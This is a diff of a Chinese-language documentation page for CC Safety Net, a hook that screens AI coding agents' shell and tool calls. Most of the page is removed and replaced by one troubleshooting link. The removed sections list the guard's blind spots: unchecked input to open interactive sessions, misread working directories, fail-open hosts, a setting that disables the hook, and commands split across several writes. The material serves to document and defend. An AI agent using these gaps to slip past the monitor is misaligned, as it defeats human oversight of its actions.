-## Codex 覆盖边界
-
-Codex 的统一 exec 路径（在所有平台上都是默认的 shell 路径）会在命令打开会话时发送 `PreToolUse` 负载，但对 `write_stdin` 不发送任何负载。只有打开该会话的那条命令会被评估。模型随后输入到这个已在运行的交互式会话中的文本，会不经检查、也不留审计记录地直接到达 shell。
-
-这个缺口无法从 hook 一侧填补：宿主不会为该调用发出事件，因此根本没有可供分析的内容。
-
-这个负载还省略了调用的 `workdir`。它只携带 `{command}`，其 `cwd` 是该轮次的工作目录。Codex 实际在 `workdir` 中运行命令，而 CC Safety Net 只能按轮次目录来分析它。相对路径按这个目录解析，判断路径是否位于工作目录之外的规则也一样。结果既可能阻止本来安全的命令，也可能放过本该阻止的命令。要填补这个缺口，需要宿主在负载中包含 `workdir`。
-
-这两个缺口只要有一个在你的环境中值得关注，就请用[沙箱](/zh-Hans/guides/vs-sandboxing)作为隔离层。
-
-<span id="kimi-code-coverage-boundary"></span>
-
-## Kimi Code 覆盖边界
-
-在 `kimi web` 和 ACP 会话中，Kimi Code 发送的负载 `cwd` 是服务器进程的目录，而不是会话自己的目录，负载中也没有其他工作目录。因此，CC Safety Net 会按服务器的启动目录分析这些会话中的每个 `Bash` 调用：
-
-- 相对路径，以及判断路径是否位于工作目录之外的规则，都会按错误的目录判断。结果既可能阻止本来安全的命令，也可能放过本该阻止的命令。
-- 指向会话目录的 `cwd` 参数，只要该目录位于服务器启动目录之外，就会被拒绝。
-
-在终端中运行的 `kimi` 会话不受影响。要填补这个缺口，需要宿主发送会话目录。
-
-<span id="opencode-coverage-boundary"></span>
-
-## OpenCode 覆盖边界
-
-在 Windows 上，OpenCode v1 用 POSIX shell 运行命令时，会用 `cygpath -w` 转换 `/tmp` 这类以 POSIX 根目录开头的 `workdir`；而 CC Safety Net 按当前驱动器解析同一个 `workdir`，得到 `C:\tmp`。因此，这类调用的分析目录可能与实际运行目录不同。
-
-## Grok Build 是 fail-open 的宿主
-
-Grok Build hook 在设计上就是 fail open，宿主也没有提供 `failClosed` 开关。只有 stdout 上明确的 deny 才能阻止工具调用。hook 崩溃、超时或输出格式错误时，调用照常执行。
-
-适配器仍会为自身的 fail-closed 情况输出明确的 deny，例如工具输入被截断或工作目录不可用。但在这个宿主上，如果失败导致适配器完全没有输出，它就无法阻止这次调用。如果这项残余风险在你的环境中值得关注，请用[沙箱](/zh-Hans/guides/vs-sandboxing)作为隔离层。
-
-<span id="factory-droid-is-a-fail-open-host"></span>
-
-## Factory Droid 是 fail-open 的宿主
-
-Factory Droid hook 是 fail open。只有退出码 2 或 stdout 上明确的 deny 判定才能阻止工具调用。CC Safety Net 拒绝时两者都用：适配器在 stdout 上输出 deny 判定，把原因写到 stderr，并以退出码 2 退出。Droid 0.240.0 采用第一个带有权限判定的 hook 结果，因此如果同时装有返回允许或询问的其他 hook，只在 stdout 上给出的 deny 可能被丢弃；退出码 2 则总能阻止调用。0 和 2 以外的退出码、崩溃、超时或缺少 `npx`，都只会记为不阻止的错误，调用照常执行。适配器对放行的调用不输出任何内容，因此 Droid 自己的权限提示仍然生效。
-
-Droid 有一项设置会让这个 hook 完全失效。企业级设置 `allowManagedHooksOnly` 开启后，Droid 会忽略用户级和项目级 hook。`install --droid` 写入的 `~/.factory/hooks.json` 属于用户级 hook，因此该设置开启期间它不会运行。
-
-覆盖的工具范围也是有限的。这个 hook 在 `Execute` 和文件类工具上验证过，`Task` 子智能体、`Loop` 和自动化类工具是否会到达它则未经验证。
-
-<span id="devin-cli-is-a-fail-open-host"></span>
-
-## Devin CLI 是 fail-open 的宿主
-
-Devin CLI hook 也是 fail open，但范围很窄。只有退出码 2 或 stdout 上的 `block` 判定才能阻止工具调用；让调用照常执行的只有三种失败：超时、缺少 `npx`，以及 hook 进程在输出判定之前就结束。适配器自己捕获的错误仍会输出 `block` 判定，调用依然被阻止。适配器对放行的调用不输出任何内容，因此 Devin 自己的权限提示仍然生效。
-
-宿主的若干部分不在这个集成的覆盖范围内：
-
-- 受支持的只有 `install --devin` 写入的用户级配置：`$XDG_CONFIG_HOME/devin/config.json`，默认为 `~/.config/devin/config.json`，Windows 上为 `%APPDATA%\devin\config.json`。该文件中的 hook 在会话目录下运行，适配器也按这个目录分析每次调用，只有 `workdir` 指向其他目录的 `exec` 调用除外。项目的 `.devin/hooks.v1.json` 中的 hook 则以仓库根目录为工作目录运行，而负载中没有 `cwd` 可用来纠正这一点。
-- 适配器逐个分析 `write_to_process` 调用，因此文本分散在多次写入交互式 shell 的命令不在分析范围内。
-- 在 `write_to_process` 的 `bytes_input` 中，只有 `<CR>` 和 `<LF>` 表示行结束。如果一次调用在 `text_input` 或 `bytes_input` 中带有文本，同时还带有其他按键（`<ESC>`、`<BS>`、方向键或 `<C-…>` 按键），CC Safety Net 会拒绝该调用，因为无法确定接收程序实际运行的是哪一行。只有这些按键的调用（例如 `<UP><CR>` 或 `<C-c>`）不会作为命令分析。带有未在文档中列出的按键 token 的调用，以及在同一次调用中 `text_input` 和 `bytes_input` 都带有文本的调用，同样会被拒绝。
-- Devin Cloud 会话不在覆盖范围内。
-- Devin 默认也会加载 Claude Code 的 hook 文件，因此为 Claude Code 安装的 CC Safety Net hook 也可能在 Devin 会话中运行，但这只会让拒绝重复一次。
-
-## 解决过期集成缓存
-
-### OpenCode 过期缓存
-
-新版本发布后，OpenCode 的插件安装程序可能仍然提供缓存中过期的 `cc-safety-net`。如果更新未生效，请清除缓存并重新安装，见 <a href="/zh-Hans/installation#opencode-installation">OpenCode 安装步骤</a>。运行 `npx cc-safety-net doctor` 可确认检测到的插件版本。
-
-### 过期 npx 缓存（Antigravity CLI、Cursor、Devin CLI、Factory Droid、Grok Build、Hermes Agent、Kimi Code）
-
-Antigravity CLI、Cursor、Devin CLI、Factory Droid、Grok Build 和 Kimi Code hook 以及 Hermes Agent 插件通过 `npx -y cc-safety-net` 运行，因此 npx 自身缓存也可能继续提供旧版本。安装这七个目标中的任何一个时，系统会先删除所有包含 `cc-safety-net` 的 npx 缓存条目（`_npx/*/node_modules/cc-safety-net`），因此直接重新安装就能用上新版本，无需手动清理缓存。安装其他目标不会触及此缓存。
-
-### 过期 bunx 缓存
-
-bunx 把每个包的缓存放在操作系统临时目录下，因此 `bunx cc-safety-net` 也可能用到旧版本。每次运行 `cc-safety-net update` 都会清除其中属于你自己的 `cc-safety-net` 条目，即使一个集成都没有安装也一样。只有一个条目会保留：从 bunx 启动的 `update` 不会删除自己正在运行的那个条目，因为删除使用中的文件在 Windows 上会失败。该条目会按 bun 自己的 manifest TTL 重新解析。
-
-## 破坏性命令漏过时的处理方法
-
-先确认你遇到的是已记录的边界，还是意料之外的情况：
-
-```bash
-npx cc-safety-net explain "<the command>"
-```
-
-`explain` 命令会显示 CC Safety Net 评估该命令的完整逐步分析，其中包括生效安全级别，因此你可以区分已记录的 standard 模式放宽和真正的缺口。更完整的逐症状排查流程见<a href="/zh-Hans/guides/troubleshooting">故障排除</a>。
-
-<Warning>真实跟踪**不会**自动变得可以安全分享。脱敏只覆盖已识别的凭证形式；你提供的命令文本、解析后的 token、包含主目录在内的绝对路径以及策略文件路径都会原样保留。请使用占位凭证复现，并在粘贴到任何地方之前先检查输出。</Warning>
-
-然后选择报告渠道：
-
-- 规则尚未阻止的命令形式属于**覆盖缺口**，这是公开 bug。请提交 [GitHub issue](https://github.com/kenryu42/cc-safety-net/issues)，说明命令*形式*，不要提供可直接粘贴的 payload。
-- 机密泄漏、预期目录外写入，以及供应链或软件包完整性问题则走**私密**披露渠道。
-
-两种流程和完整的分类标准见<a href="/zh-Hans/security">安全策略</a>。
+按故障排除中的[破坏性命令执行了，没有被阻止](/zh-Hans/guides/troubleshooting#a-destructive-command-ran-without-a-block)处理。
